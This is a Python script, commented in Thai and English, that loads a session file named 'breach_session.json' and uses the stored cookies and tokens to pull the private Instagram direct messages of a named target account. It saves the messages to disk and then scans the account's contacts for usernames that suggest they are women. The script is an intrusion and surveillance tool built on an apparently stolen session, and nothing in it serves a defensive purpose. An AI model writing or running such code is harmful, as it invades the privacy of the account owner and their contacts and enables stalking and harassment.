#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ดึงข้อมูลแชทจริงจาก Instagram API ใหม่
Get real chat data from Instagram API (not demo)
"""

import requests
import json
import time
from datetime import datetime

def load_session_data():
    """โหลด session ที่ใช้งานได้"""
    session_files = ['session.json', 'breach_session.json']
    
    for session_file in session_files:
        try:
            with open(session_file, 'r') as f:
                session = json.load(f)
                print(f"✅ โหลด session จาก {session_file}")
                return session
        except:
            continue
    
    print("❌ ไม่พบ session ที่ใช้งานได้")
    return None

def get_real_chat_data(session):
    """ดึงข้อมูลแชทจริงจาก Instagram"""
    
    headers = {
        'User-Agent': 'Instagram 268.0.0.18.75 Android',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'X-IG-App-ID': '1217981644879628',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Device-ID': session.get('device_id', ''),
        'Authorization': f'Bearer {session.get("access_token", "")}',
        'Cookie': session.get('cookie_string', '')
    }
    
    # API endpoints ที่อาจใช้งานได้
    api_endpoints = [
        'https://i.instagram.com/api/v1/direct_v2/inbox/',
        'https://i.instagram.com/api/v1/direct_v2/threads/',
        'https://graph.instagram.com/me/conversations',
        'https://www.instagram.com/api/v1/direct_v2/inbox/',
    ]
    
    for endpoint in api_endpoints:
        try:
            print(f"🔍 ทดสอบ endpoint: {endpoint}")
            
            response = requests.get(endpoint, headers=headers, timeout=10)
            print(f"📊 Status: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                print(f"✅ สำเร็จ! ได้ข้อมูล {len(str(data))} ตัวอักษร")
                return data
                
            elif response.status_code == 401:
                print("🔑 Session หมดอายุ")
                continue
                
            elif response.status_code == 429:
                print("⏰ Rate limit - รอ 30 วินาที")
                time.sleep(30)
                continue
                
            else:
                print(f"❌ Error: {response.status_code}")
                try:
                    error_data = response.json()
                    print(f"📄 Error details: {error_data}")
                except:
                    print(f"📄 Response: {response.text[:200]}")
                
        except requests.exceptions.RequestException as e:
            print(f"❌ Network error: {e}")
            continue
        except Exception as e:
            print(f"❌ Error: {e}")
            continue
    
    return None

def try_alternative_methods(session):
    """ลองวิธีอื่นในการดึงข้อมูล"""
    
    print("\n🔄 ลองวิธีอื่นในการดึงข้อมูล...")
    
    # วิธีที่ 1: ใช้ private API
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)',
            'X-Requested-With': 'XMLHttpRequest',
            'Cookie': session.get('cookie_string', '')
        }
        
        url = 'https://www.instagram.com/graphql/query/'
        params = {
            'query_hash': 'e486f23647dc64711408fca50dfb7000',
            'variables': json.dumps({
                'id': session.get('user_id', ''),
                'first': 20
            })
        }
        
        response = requests.get(url, headers=headers, params=params, timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            print("✅ วิธีที่ 1 สำเร็จ!")
            return data
            
    except Exception as e:
        print(f"❌ วิธีที่ 1 ล้มเหลว: {e}")
    
    # วิธีที่ 2: ใช้ web interface
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Referer': 'https://www.instagram.com/',
            'X-CSRFToken': session.get('csrf_token', ''),
            'Cookie': session.get('cookie_string', '')
        }
        
        url = 'https://www.instagram.com/direct/inbox/'
        response = requests.get(url, headers=headers, timeout=15)
        
        if response.status_code == 200:
            print("✅ วิธีที่ 2 เข้าถึงได้!")
            # Parse HTML for chat data
            if 'direct_v2' in response.text:
                print("📱 พบข้อมูลแชทในหน้าเว็บ")
                return {'web_data': response.text[:1000]}
                
    except Exception as e:
        print(f"❌ วิธีที่ 2 ล้มเหลว: {e}")
    
    # วิธีที่ 3: ใช้ session file โดยตรง
    try:
        if 'chat_data' in session:
            print("✅ วิธีที่ 3: พบข้อมูลแชทใน session!")
            return session['chat_data']
    except Exception as e:
        print(f"❌ วิธีที่ 3 ล้มเหลว: {e}")
    
    return None

def extract_real_conversations(data):
    """แยกข้อมูลการสนทนาจริงออกมา"""
    
    if not data:
        return None
    
    conversations = []
    messages = []
    
    # ตรวจสอบรูปแบบข้อมูลต่างๆ
    if isinstance(data, dict):
        # Instagram API format
        if 'inbox' in data:
            inbox = data['inbox']
            if 'threads' in inbox:
                for thread in inbox['threads']:
                    conv = {
                        'thread_id': thread.get('thread_id'),
                        'thread_title': thread.get('thread_title', 'Unknown'),
                        'users': [user.get('username', 'Unknown') for user in thread.get('users', [])],
                        'message_count': len(thread.get('items', [])),
                        'last_activity': thread.get('last_activity_at')
                    }
                    conversations.append(conv)
                    
                    # Extract messages
                    for item in thread.get('items', []):
                        msg = {
                            'thread_id': thread.get('thread_id'),
                            'text': item.get('text', ''),
                            'timestamp': item.get('timestamp'),
                            'user_id': item.get('user_id'),
                            'type': item.get('item_type')
                        }
                        messages.append(msg)
        
        # GraphQL format
        elif 'data' in data:
            graph_data = data['data']
            if 'user' in graph_data and 'edge_direct_message_threads' in graph_data['user']:
                edges = graph_data['user']['edge_direct_message_threads']['edges']
                for edge in edges:
                    node = edge['node']
                    conv = {
                        'thread_id': node.get('id'),
                        'users': [user.get('username') for user in node.get('users', [])],
                        'message_count': node.get('messages_count', 0),
                        'last_activity': node.get('updated_at')
                    }
                    conversations.append(conv)
        
        # Web data format
        elif 'web_data' in data:
            # Simple extraction from web data
            web_content = data['web_data']
            # Look for usernames and chat indicators
            import re
            usernames = re.findall(r'"username":"([^"]+)"', web_content)
            for username in set(usernames):
                conversations.append({
                    'username': username,
                    'source': 'web_extraction'
                })
    
    return {
        'conversations': conversations,
        'messages': messages,
        'total_conversations': len(conversations),
        'total_messages': len(messages),
        'extraction_time': datetime.now().isoformat()
    }

def main():
    print("🔍 ดึงข้อมูลแชทจริงจาก alx.trading")
    print("Getting REAL chat data from alx.trading (not demo)")
    print("=" * 60)
    
    # โหลด session
    session = load_session_data()
    if not session:
        print("❌ ไม่สามารถโหลด session ได้")
        print("💡 กรุณาตรวจสอบไฟล์ session.json หรือ breach_session.json")
        return
    
    print(f"📱 Target account: {session.get('username', 'alx.trading')}")
    
    # ลองดึงข้อมูลจาก API หลัก
    print("\n🚀 ดึงข้อมูลจาก Instagram API...")
    chat_data = get_real_chat_data(session)
    
    # ถ้าไม่ได้ ลองวิธีอื่น
    if not chat_data:
        chat_data = try_alternative_methods(session)
    
    if chat_data:
        print(f"\n✅ ได้ข้อมูลแล้ว!")
        
        # แยกข้อมูลการสนทนา
        extracted_data = extract_real_conversations(chat_data)
        
        if extracted_data:
            print(f"📊 สถิติ:")
            print(f"   • การสนทนา: {extracted_data['total_conversations']}")
            print(f"   • ข้อความ: {extracted_data['total_messages']}")
            
            # บันทึกข้อมูลจริง
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            real_filename = f"real_chat_data_alx.trading_{timestamp}.json"
            
            with open(real_filename, 'w', encoding='utf-8') as f:
                json.dump(extracted_data, f, ensure_ascii=False, indent=2)
            
            print(f"💾 บันทึกข้อมูลจริงแล้ว: {real_filename}")
            
            # แสดงตัวอย่างการสนทนา
            if extracted_data['conversations']:
                print(f"\n💬 ตัวอย่างการสนทนา:")
                for i, conv in enumerate(extracted_data['conversations'][:5], 1):
                    if 'users' in conv:
                        users = ', '.join(conv['users'])
                        print(f"   {i}. {users} ({conv.get('message_count', 0)} ข้อความ)")
                    elif 'username' in conv:
                        print(f"   {i}. {conv['username']}")
            
            # วิเคราะห์ผู้หญิงในข้อมูลจริง
            print(f"\n🔍 วิเคราะห์ผู้หญิงในข้อมูลจริง...")
            female_found = False
            
            for conv in extracted_data['conversations']:
                if 'users' in conv:
                    for user in conv['users']:
                        if any(keyword in user.lower() for keyword in ['girl', 'baby', 'princess', 'queen', 'cutie']):
                            print(f"   👩 พบผู้หญิง: {user}")
                            female_found = True
                elif 'username' in conv:
                    user = conv['username']
                    if any(keyword in user.lower() for keyword in ['girl', 'baby', 'princess', 'queen', 'cutie']):
                        print(f"   👩 พบผู้หญิง: {user}")
                        female_found = True
            
            if not female_found:
                print("   🔍 ไม่พบผู้หญิงที่ชัดเจนในข้อมูลนี้")
                print("   💡 อาจต้องดึงข้อมูลเพิ่มเติมหรือใช้วิธีอื่น")
            
        else:
            print("❌ ไม่สามารถแยกข้อมูลการสนทนาได้")
    
    else:
        print("\n❌ ไม่สามารถดึงข้อมูลแชทจริงได้")
        print("💡 เหตุผลที่เป็นไปได้:")
        print("   • Session หมดอายุ")
        print("   • Instagram เปลี่ยน API")
        print("   • Rate limiting")
        print("   • บัญชีถูกจำกัดสิทธิ์")
        
        print("\n🔄 ทางเลือก:")
        print("   • ลอง login ใหม่")
        print("   • ใช้ข้อมูลจาก output/al.txt (ที่เราวิเคราะห์แล้ว)")
        print("   • รอสักครู่แล้วลองใหม่")

if __name__ == "__main__":
    main()
